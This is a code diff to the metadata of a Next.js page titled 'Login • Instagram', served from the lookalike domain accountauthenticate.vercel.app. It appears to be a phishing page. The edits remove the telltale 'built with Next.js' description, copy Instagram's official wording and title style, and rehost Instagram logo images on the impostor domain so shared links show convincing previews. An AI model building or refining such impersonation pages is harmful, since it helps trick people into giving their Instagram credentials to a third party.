@@ -6,19 +6,20 @@ const inter = Inter({ subsets: ['latin'] });
 
 export const metadata: Metadata = {
   title: 'Login • Instagram',
-  description: 'Instagram Log-in Page built with Next.js',
+  description: 'Log in to Instagram to connect with friends and share your moments',
   icons: {
-    icon: '/favicon.ico?v=2',  // ?v=2 forces a fresh load
+    icon: '/favicon.ico?v=2',
   },
   openGraph: {
-    title: 'Instagram Login',
+    title: 'Login • Instagram',
     description: 'Log in to Instagram to connect with friends and share your moments',
     url: 'https://accountauthenticate.vercel.app',
     siteName: 'Instagram',
     images: [
       {
-        url: 'https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png',
-        width: 800,
+        // Use a SQUARE logo (1:1 aspect ratio) for better previews
+        url: 'https://accountauthenticate.vercel.app/instagram-square-logo.png', // Replace with your hosted square image
+        width: 600,
         height: 600,
         alt: 'Instagram Logo',
       },
@@ -28,9 +29,9 @@ export const metadata: Metadata = {
   },
   twitter: {
     card: 'summary_large_image',
-    title: 'Instagram Login',
+    title: 'Login • Instagram',
     description: 'Log in to Instagram to connect with friends and share your moments',
-    images: ['https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png'],
+    images: ['https://accountauthenticate.vercel.app/preview.png'], // Same square image
   },
 };
 
